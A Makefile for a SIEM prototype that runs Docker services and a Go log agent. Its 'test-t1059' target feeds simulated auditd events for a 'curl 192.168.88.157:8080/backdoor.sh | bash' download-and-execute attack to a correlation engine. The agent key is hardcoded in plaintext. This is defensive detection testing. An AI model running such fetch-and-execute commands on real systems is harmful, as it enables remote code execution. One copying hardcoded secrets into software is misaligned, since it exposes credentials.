.PHONY: up down restart logs build-agent test-t1059 fix-perms

up: build-agent
	@echo "🧪 Cleaning up potential container conflicts..."
	@-docker rm -f siem_api 2>/dev/null || true
	@echo "🚀 Starting SIEM infrastructure (API, DB, OpenSearch, Data Prepper)..."
	./docker-compose-v2 up -d --build
	@echo "🛡️  Starting Go Agent in the background..."
	@echo "   (You may be prompted for your sudo password to allow reading /var/log/syslog)"
	@sudo -v
	@# Kill any existing agent process before starting a new one
	@-sudo pkill -f "./agent/agent" 2>/dev/null || true
	@sudo AGENT_SERVER_URL=http://localhost:8000 \
		AGENT_KEY=75718048f662d6b143fc27c3b1053ea90923c2ba4b2601ae484f2653ab103e79 \
		nohup ./agent/agent > agent.log 2>&1 &
	@echo ""
	@echo "✅ SIEM Prototype is UP & RUNNING!"
	@echo "➡️  Dashboard:          http://localhost:8000/dashboard"
	@echo "➡️  OpenSearch:         http://localhost:9200"
	@echo "➡️  OpenSearch Dashboards (debug): http://localhost:5601"
	@echo "➡️  Data Prepper:       http://localhost:2021"
	@echo "➡️  Agent Logs:         tail -f agent.log"
	@echo "➡️  Services:           docker-compose logs -f"
	@echo ""
	@echo "🛑 To stop everything, run: make down"

build-agent:
	@echo "🔨 Building Go Agent..."
	@mkdir -p api/downloads
	@cd agent && GOOS=linux GOARCH=amd64 go build -o ../api/downloads/ovs-agent-linux-amd64 ./cmd/agent/main.go
	@echo "✅ Agent built and copied to api/downloads/ovs-agent-linux-amd64"

down:
	@echo "🛑 Stopping SIEM infrastructure..."
	@-docker rm -f siem_api 2>/dev/null || true
	./docker-compose-v2 down
	@echo "🛑 Stopping Go Agent process..."
	@-sudo pkill -f "./agent/agent" 2>/dev/null || true
	@echo "✅ Everything stopped."

restart: down up

logs:
	./docker-compose-v2 logs -f

fix-perms:
	@echo "Fixing volume directory permissions for Docker non-root user (UID 1001)..."
	@[ -d ./api/downloads ] && sudo chown -R 1001:1001 ./api/downloads || true
	@[ -d ./api/logs ]      && sudo chown -R 1001:1001 ./api/logs      || true
	@[ -d ./api/uploads ]   && sudo chown -R 1001:1001 ./api/uploads   || true
	@echo "Done. Run 'make restart' to apply."

# Simulate "curl IP:port/backdoor.sh | bash" through the correlation engine.
# Three steps: Event A (curl), Event B (bash), then a flush-trigger event after the
# 2-second aggregation TTL so the engine receives both buffered events.
LOCALHOST_AGENT_KEY = 75718048f662d6b143fc27c3b1053ea90923c2ba4b2601ae484f2653ab103e79

test-t1059:
	@echo "🧪 Event A — curl with bare IP URL (no http:// scheme)..."
	@curl -s -X POST http://localhost:8000/ingest/log \
		-H "Content-Type: application/json" \
		-H "X-Agent-Key: $(LOCALHOST_AGENT_KEY)" \
		-d '{"log_type":"auditd","message":"type=EXECVE msg=audit(1720000100.000:400): argc=2 a0=\"curl\" a1=\"192.168.88.157:8080/backdoor.sh\""}' | python3 -m json.tool
	@sleep 1
	@echo "🧪 Event B — bash shell execution (pipe consumer)..."
	@curl -s -X POST http://localhost:8000/ingest/log \
		-H "Content-Type: application/json" \
		-H "X-Agent-Key: $(LOCALHOST_AGENT_KEY)" \
		-d '{"log_type":"auditd","message":"type=EXECVE msg=audit(1720000101.000:401): argc=1 a0=\"bash\""}' | python3 -m json.tool
	@echo "⏳ Waiting 3s for 2s aggregation TTL to expire..."
	@sleep 3
	@echo "🧪 Flush trigger — sends a new auditd event to flush expired buffer entries..."
	@curl -s -X POST http://localhost:8000/ingest/log \
		-H "Content-Type: application/json" \
		-H "X-Agent-Key: $(LOCALHOST_AGENT_KEY)" \
		-d '{"log_type":"auditd","message":"type=SYSCALL msg=audit(1720000104.000:402): arch=c000003e syscall=59 success=yes comm=\"id\" key=\"T1059\""}' | python3 -m json.tool
	@echo "⏳ Waiting 2s for detection to complete..."
	@sleep 2
	@echo "🔍 Checking for T1059/correlation alerts in PostgreSQL..."
	@./docker-compose-v2 exec -T db psql -U user -d siemdb -c "SELECT title, host, severity, detection_engine, timestamp FROM alerts WHERE mitre_technique LIKE '%T1059%' ORDER BY timestamp DESC LIMIT 5;"
